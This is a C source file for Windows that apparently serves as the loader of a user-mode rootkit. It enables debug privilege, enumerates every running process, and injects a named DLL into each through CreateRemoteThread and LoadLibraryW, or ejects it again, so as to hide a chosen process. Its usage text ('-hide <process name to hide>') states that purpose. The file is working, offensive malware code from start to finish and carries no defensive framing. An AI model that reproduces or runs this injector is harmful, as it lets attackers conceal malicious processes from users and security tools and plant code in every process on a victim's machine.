
#include<windows.h>
#include<stdio.h>
#include<tlhelp32.h>
#include<tchar.h>

typedef void(*PFN_SetProcName)(LPCTSTR szProcName);

enum {INJECTION_MODE = 0, EJECTION_MODE};

BOOL SetPrivilege(LPCTSTR, BOOL);
BOOL InjectDll(DWORD, LPCTSTR);
BOOL EjectDll(DWORD, LPCTSTR);
BOOL Inject_Or_Eject_AllProcess(int, LPCTSTR);

int _tmain(int argc, TCHAR * argv[])
{

	int nMode = INJECTION_MODE;
	HMODULE hLib = NULL;
	PFN_SetProcName SetProcName = NULL;

	if (argc != 4)
	{
		printf("\n usage : %s <-hide|-show> <process name to hide> <DLL path>", argv[0]);
		return 1;

	}

	SetPrivilege(SE_DEBUG_NAME, TRUE);

	hLib = LoadLibrary(argv[3]);

	SetProcName = (PFN_SetProcName)GetProcAddress(hLib, "SetProcName");
	SetProcName(argv[2]);

	if (!_tcsicmp(argv[1], L"-show"))
		nMode = EJECTION_MODE;

	Inject_Or_Eject_AllProcess(nMode, argv[3]);
	FreeLibrary(hLib);
	return 0;


}



BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnalePrivilege)
{
	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		printf("OpenProcessToken error : %u\n", GetLastError());
		return FALSE;

	}


	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;

	}


	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	if (bEnalePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error : %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("The token dos not have the specified privilege \n");
		return FALSE;

	}


	return TRUE;

}



BOOL Inject_Or_Eject_AllProcess(int nMode, LPCTSTR szDllPath)
{
	DWORD dwPID = 0;
	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;

	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	Process32First(hSnapShot, &pe);

	do
	{
		dwPID = pe.th32ProcessID;

		if (dwPID < 100)
			continue;

		if (nMode == INJECTION_MODE)
			InjectDll(dwPID, szDllPath);
		else
			EjectDll(dwPID, szDllPath);
		
	} while (Process32Next(hSnapShot, &pe));

	CloseHandle(hSnapShot);
	return TRUE;

}


BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
{
	HANDLE hProcess = NULL, hThread = NULL;
	HMODULE hMod = NULL;
	LPVOID pRemoteBuf = NULL; 
	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
	LPTHREAD_START_ROUTINE pThreadProc;

	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
	{
		_tprintf(L"OpenProcess(%d) failed!! [%d]\n", dwPID, GetLastError());
		return FALSE;

	}

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

	hMod = GetModuleHandle(L"kernel32.dll");
	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, "LoadLibraryW");

	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;

}


BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName)
{
	HANDLE hSnapshot, hProcess, hThread;
	MODULEENTRY32 me = { sizeof(me) };
	BOOL bMore = FALSE, bFound = FALSE;
	LPTHREAD_START_ROUTINE pThreadProc;

	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)) == INVALID_HANDLE_VALUE)
		return FALSE;

	bMore = Module32First(hSnapshot, &me);
	for (; bMore; bMore = Module32Next(hSnapshot, &me))
	{
		if (!_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName))
		{

			bFound = TRUE;
			break;
		}
	}

	if (!bFound)
	{
		OutputDebugStringA("No dll here");
		CloseHandle(hSnapshot);
		return FALSE;

	}
	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
	{

		OutputDebugStringA("error OpenProcess");
		return FALSE;
	}

	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FreeLibrary");

	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.hModule, 0, NULL);

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnapshot);

	return TRUE;
	

}